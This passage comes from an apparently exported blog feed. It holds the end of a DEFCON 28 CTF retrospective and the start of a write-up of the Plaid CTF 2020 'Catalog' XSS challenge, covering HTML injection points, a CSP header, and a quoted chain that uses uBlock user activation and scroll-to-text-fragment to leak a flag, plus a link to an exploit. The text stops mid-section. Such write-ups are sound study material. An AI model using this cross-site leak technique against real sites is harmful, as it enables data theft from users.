&#x7684;&#x7EDF;&#x6CBB;&#x529B;&#x3002;</p><p>&#x81EA;&#x5DF1;&#x5728;&#x6BD4;&#x8D5B;&#x7684;&#x65F6;&#x5019;&#x7531;&#x4E8E;&#x81EA;&#x8EAB;&#x80FD;&#x529B;&#x8F83;&#x5DEE;&#x4EE5;&#x53CA;&#x7B2C;&#x4E00;&#x6B21;&#x8DDF;&#x5927;&#x5E08;&#x5085;&#x4EEC;&#x914D;&#x5408;&#xFF0C;&#x5F53;&#x65F6;&#x6BD4;&#x8D5B;&#x914D;&#x5408;&#x5F97;&#x4E0D;&#x662F;&#x76F8;&#x5F53;&#x7684;&#x597D;&#xFF0C;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x4E86;&#x4E00;&#x4E9B;&#x5931;&#x5206;&#xFF0C;&#x5982;&#x679C;&#x4EE5;&#x540E;&#x8FD8;&#x6709;&#x673A;&#x4F1A;&#xFF0C;&#x5E0C;&#x671B;&#x81EA;&#x5DF1;&#x63D0;&#x5347;&#x80FD;&#x529B;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x4E5F;&#x80FD;&#x5C3D;&#x91CF;&#x63D0;&#x9AD8;&#x4E00;&#x4E9B;&#x5408;&#x4F5C;&#x7684;&#x80FD;&#x529B;&#x3002;</p><p>&#x603B;&#x7684;&#x6765;&#x8BF4;&#xFF0C;&#x6CE1;&#x9762;&#x3001;&#x5916;&#x5356;&#x5F88;&#x597D;&#x5403;&#xFF0C;&#x516C;&#x53F8;&#x529E;&#x516C;&#x6905;&#x5F88;&#x8212;&#x670D;&#xFF0C;&#x201C;&#x7F51;&#x7BA1;&#x201D;&#x8FD0;&#x7EF4;&#x9009;&#x624B;&#x975E;&#x5E38;&#x7ED9;&#x529B;&#xFF0C;&#x5927;&#x5E08;&#x5085;&#x4EEC;&#x90FD;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x7684;&#x5389;&#x5BB3;&#x3002;&#x4ECA;&#x5E74;&#x5BF9;&#x4E00;&#x5F00;&#x59CB;&#x7684; KOH &#x4EE5;&#x53CA;&#x6700;&#x540E;&#x7684; Web &#x505A;&#x4E86;&#x4E00;&#x70B9;&#x70B9;&#x5FAE;&#x5C0F;&#x7684;&#x8D21;&#x732E;&#xFF0C;&#x5982;&#x679C;&#x4EE5;&#x540E;&#x6709;&#x673A;&#x4F1A;&#x7684;&#x8BDD;&#x5E0C;&#x671B;&#x80FD;&#x505A;&#x5230;&#x66F4;&#x5927;&#x7684;&#x8D21;&#x732E;&#x53ED;&#xFF01;</p><p>&#x518D;&#x6B21;&#x606D;&#x559C; A*0*E &#x62FF;&#x5230; DEFCON 28 CTF Final &#x51A0;&#x519B;&#xFF01;</p><h1 id="Others-Notes"><a href="#Others-Notes" class="headerlink" title="Others Notes"></a>Others Notes</h1><p>PPP &#x2013; Zach Wade &#x7684;&#x56DE;&#x987E;&#xFF1A; <a href="https://dttw.tech/posts/Skww4fzGP" target="_blank" rel="noopener">Kernel Panic: A DEF CON 2020 Retrospective</a></p><p>r3kapig &#x2013; Y1ng &#x7684;&#x56DE;&#x987E;&#xFF1A;<a href="https://www.gem-love.com/ctf/2558.html" target="_blank" rel="noopener">DEFCON 28 CTF Final Safe Mode&#x53C2;&#x8D5B;&#x8BB0;&#x5F55;</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/</id>
        <title><![CDATA[Plaid CTF 2020 Catalog]]></title>
        <updated>2021-02-12T10:29:56+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/"><![CDATA[<html><head></head><body><p>&#x672C;&#x6587;&#x662F;&#x5173;&#x4E8E; Plaid CTF 2020 Catalog &#x9898;&#x76EE;&#x7684;&#x4E00;&#x4E9B;&#x590D;&#x76D8;&#x4E0E;&#x63A2;&#x7A76;&#x3002;</p><a id="more"></a><p>&#x8FD9;&#x9053;&#x9898;&#x662F;&#x672C;&#x6B21; PlaidCTF &#x5168;&#x573A;&#x552F;&#x4E00;&#x4E00;&#x9053;0&#x89E3;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;&#x662F;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x96BE;&#x5EA6;&#x7684;&#xFF0C;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x3002;&#x8FD9;&#x91CC;&#x975E;&#x5E38;&#x611F;&#x8C22; @wupco @rebirthwyw @bks25wzsx&#xFF08;&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;@zsx &#x53C8;&#x540D; @bks25wzsx&#xFF09;&#x5E08;&#x5085;&#x4EEC;&#x7684;&#x6307;&#x70B9;&#xFF0C;&#x590D;&#x76D8;&#x7684;&#x65F6;&#x5019;&#x6BD4;&#x8F83;&#x8270;&#x96BE;&#xFF0C;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x6211;&#x4F1A;&#x5C3D;&#x91CF;&#x7528;&#x81EA;&#x5DF1;&#x8FD8;&#x7B97;&#x6BD4;&#x8F83;&#x6E05;&#x6670;&#x7684;&#x903B;&#x8F91;&#x8BB2;&#x4E00;&#x4E0B;&#x672C;&#x9053;&#x9898;&#xFF0C;&#x5982;&#x679C;&#x54EA;&#x91CC;&#x6709;&#x51FA;&#x9519;&#x7684;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x4EEC;&#x591A;&#x591A;&#x5305;&#x6DB5;&#x3002;</p><p>&#x7531;&#x4E8E;&#x8FD9;&#x4E2A;&#x9898;&#x662F;&#x590D;&#x76D8;&#x9898;&#xFF0C;&#x6240;&#x4EE5;&#x505A;&#x9898;&#x601D;&#x8DEF;&#x53EF;&#x80FD;&#x4F1A;&#x5C11;&#x4E00;&#x4E9B;&#xFF0C;&#x66F4;&#x591A;&#x7684;&#x662F;&#x5BF9;&#x4E8E;&#x51FA;&#x9898;&#x70B9;&#x4EE5;&#x53CA;exp&#x4E00;&#x4E9B;&#x5206;&#x6790;&#x4EC0;&#x4E48;&#x7684;&#x3002;</p><blockquote class="colorquote danger"><p>5&#x6708;6&#x65E5;&#x66F4;&#x65B0;&#xFF1A;&#x4F5C;&#x8005;&#x5DF2;&#x7ECF;&#x653E;&#x51FA;&#x4E86;&#x4ED6;&#x7684; Write Up&#x2014;&#x2014;<a href="https://dttw.tech/posts/B19RXWzYL" target="_blank" rel="noopener">PlaidCTF 2020: Catalog Writeup</a> &#xFF0C;&#x9898;&#x76EE;&#x4ED3;&#x5E93;&#x2014;&#x2014; <a href="https://github.com/bluepichu/ctf-challenges/tree/master/plaidctf-2020/catalog" target="_blank" rel="noopener">catalog</a> &#xFF0C;&#x6587;&#x4E2D;&#x5185;&#x5BB9;&#x53EF;&#x80FD;&#x4E0E;&#x4F5C;&#x8005; Write Up &#x6709;&#x4E9B;&#x8BB8;&#x51FA;&#x5165;&#xFF0C;&#x8BF7;&#x4EE5;&#x4F5C;&#x8005;&#x7684; Write Up &#x4E3A;&#x51C6;&#xFF01;&#x672C;&#x6587;&#x6682;&#x672A;&#x66F4;&#x65B0;&#xFF01;</p></blockquote><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><blockquote><p><a href="http://catalog.pwni.ng/" target="_blank" rel="noopener">Here&#x2019;s the site</a>. The flag is on <a href="http://catalog.pwni.ng/issue.php?id=3" target="_blank" rel="noopener">this page</a>.</p><p>Browser: Chromium <strong>with uBlock Origin 1.26.0 installed and in its default configuration</strong></p><p>Flag format: <code>/^PCTF\{[A-Z0-9_]+\}$/</code></p><p><strong>Hints</strong>:</p><ul><li>To view your post, the admin will click on a link on the admin page.</li><li>You might want to read up on User Activation.</li><li>The intended solution does not require you to submit hundreds of captchas.</li></ul><p>Hint: Admin Bot Timeout</p><p>The admin bot will always disconnect after about 30 seconds.    </p></blockquote><p>&#x7ED9;&#x6CA1;&#x6709;&#x770B;&#x9898;&#x7684;&#x5C0F;&#x4F19;&#x4F34;&#x7B80;&#x7565;&#x5730;&#x6982;&#x62EC;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#xFF0C;&#x9898;&#x76EE;&#x662F;&#x4E2A;&#x9ED1;&#x76D2;&#xFF0C;&#x6709;&#x767B;&#x5F55;&#x6CE8;&#x518C;&#x3001;&#x53D1;&#x8868; issue &#x3001;&#x63D0;&#x4EA4; issue &#x7ED9; admin &#x770B;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x8FD9;&#x4E9B;&#x529F;&#x80FD;&#xFF0C;&#x5F88;&#x660E;&#x663E;&#x9898;&#x76EE;&#x9700;&#x8981;&#x6211;&#x4EEC;&#x8FDB;&#x884C; XSS</p><p>&#x5176;&#x4E2D;&#x6709;&#x51E0;&#x4E2A;&#x7EC6;&#x8282;&#x6F0F;&#x6D1E;&#xFF1A;</p><ol><li><p>&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x76F4;&#x63A5;&#x65E0;&#x8FC7;&#x6EE4;&#x5730;&#x56DE;&#x663E;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x5904; HTML &#x6CE8;&#x5165;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423014836.png" alt></p></li><li><p>&#x5728;&#x63D0;&#x4EA4; issue &#x5904;&#xFF0C;&#x6709;&#x4E00;&#x9879;&#x9700;&#x8981;&#x63D0;&#x4EA4; image URL &#x7684;&#x5730;&#x65B9;&#x4E5F;&#x5B58;&#x5728;&#x7740; HTML &#x6CE8;&#x5165;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423021048.png" alt></p></li><li><p>&#x9898;&#x76EE;&#x8BBE;&#x7F6E;&#x8FD8;&#x4F1A;&#x5229;&#x7528; session &#x6765;&#x5B58;&#x50A8;&#x4E00;&#x4E9B; HTML &#x5143;&#x7D20;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x5728;&#x540C;&#x4E00;&#x4E2A; session &#x5148;&#x767B;&#x5F55;&#xFF0C;&#x518D;&#x7528;&#x8FD9;&#x4E2A; session &#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5237;&#x65B0;&#x6211;&#x4EEC;&#x5DF2;&#x767B;&#x5F55;&#x7684;&#x9875;&#x9762;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424222148.png" alt></p></li></ol><h3 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h3><p></p><figure class="highlight csp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&apos;nonce-xhncdWd319Yj3acHJbKoEWmK8stBxy88&apos;</span>; <span class="hljs-keyword">img-src</span> *; <span class="hljs-keyword">font-src</span> <span class="hljs-string">&apos;self&apos;</span> fonts.gstatic.com; <span class="hljs-keyword">frame-src</span> https://www.google.com/recaptcha/</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9898;&#x76EE;&#x7ED9;&#x7684; CSP &#x662F;&#x8FD9;&#x4E9B;&#xFF0C;&#x8FD9;&#x4E9B; CSP &#x9650;&#x5236;&#x4E86;&#x6211;&#x4EEC;&#x63D2;&#x5165;&#x7684;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x91CC;&#x5E76;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E; base-uri &#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BD5;&#x56FE;&#x5229;&#x7528; HTML &#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x5229;&#x7528;<code>&lt;base&gt;</code>&#x6765;&#x8FDB;&#x884C; XSS &#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x50CF; RCTF 2018 rblog &#x90A3;&#x9053;&#x9898;&#xFF0C;&#x8FD9;&#x9053;&#x9898;&#x7684;&#x63D2;&#x5165;&#x70B9;&#x5728;&#x6BD4;&#x8F83;&#x9760;&#x540E;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x63A7;&#x5236;&#x4E4B;&#x524D;&#x5F15;&#x5165;&#x6587;&#x4EF6;&#x7684; url &#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x5229;&#x7528; base uri &#x7684;&#x601D;&#x8DEF;&#x6765;&#x8FDB;&#x884C; XSS </p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><blockquote><p>Catalog has two injections: the image tag on the issue page and the username when you fail to login.  Use the image tag one with a meta redirect to get offsite.  Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.  Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.  Now make a no-cors POST to use the failed login injection, then send them to issue.php?id=3.  So now we have arbitrary content with a user activation on the correct page, but still no code exec.  (&#x2026;the rest of the exploit to come in a moment&#x2026;)</p><p>(&#x2026;continuation of previous post&#x2026;) Ok, but what can we do?  A recent addition to Chromium was scroll-to-text-fragment, which lets you search the page for text (in entire words only) and scroll to it, <em>though this consumes the user activation</em>.  If you could search for a letter at a time, then you could use your injection to add a bunch of whitespace and a lazy-loading image to detect the scroll.It turns out you can: the whole-word match counts tag boundaries as word boundaries, and the <code>&lt;em&gt;</code> tag gets split into a <code>&lt;span&gt;</code> for each individual letter on load!  So you can do text searches of the form <code>#:~:text=F-,{,-X</code> for example to search for an X at the beginning of the flag.  You can specify multiple text searches to do a binary search across the whole alphabet.  Also include a meta refresh to send back offsite again after a short delay and you can leak ~5 characters per captcha.  Repeat 5 or 6 times to get the whole flag.</p></blockquote><p>&#x8FD9;&#x4E00;&#x6BB5;&#x662F;&#x8D5B;&#x540E; @bluepichu &#x5728; irc &#x4E0A;&#x8BF4;&#x7684;&#x4E00;&#x6BB5;&#x8BDD;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x5BF9; catalog &#x8FD9;&#x9053;&#x9898;&#x76EE;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x7B80;&#x77ED;&#x7684; wp &#x3002;</p><p>&#x540C;&#x65F6;&#xFF0C;@lbherrera_ &#x5728;&#x8D5B;&#x540E;&#x53D1;&#x4E86;&#x4E00;&#x4E2A;&#x63A8;&#x7279;&#x516C;&#x5F00;&#x4E86;&#x4ED6;&#x4E00;&#x90E8;&#x5206;&#x672C;&#x9898;&#x7684; exp :</p><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/lbherrera_/status/1251994130298875904" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>Exp &#x5730;&#x5740;&#x5728;: <a href="https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b" target="_blank" rel="noopener">https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b</a></p><p>&#x4F46;&#x662F;&#x6BD4;&#x8F83;&#x9057;&#x61BE;&#x7684;&#x662F;&#xFF0C;&#x8BE5;&#x4F5C;&#x8005;&#x5230;&#x76EE;&#x524D;&#x4E3A;&#x6B62;&#x8FD8;&#x5E76;&#x672A;&#x53D1;&#x5E03;&#x4ED6;&#x81EA;&#x5DF1;&#x7684; write up &#xFF0C;&#x5982;&#x679C;&#x5927;&#x5BB6;&#x80FD;&#x770B;&#x61C2;&#x8FD9;&#x4E9B;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x9898;&#x540E;&#x9762;&#x7684;&#x90E8;&#x5206;&#x5927;&#x5BB6;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x4E86;&#xFF0C;&#x540E;&#x6587;&#x4E5F;&#x5C31;&#x662F;&#x57FA;&#x672C;&#x6309;&#x7167;&#x8FD9;&#x4E2A;&#x5927;&#x81F4;&#x7684;&#x601D;&#x8DEF;&#x6765;&#x5206;&#x6790;&#x8FD9;&#x4E2A;&#x9898;&#x7684;&#x3002;    </p><h3 id="User-Activation"><a href="#User-Activation" class="headerlink" title="User Activation"></a>User 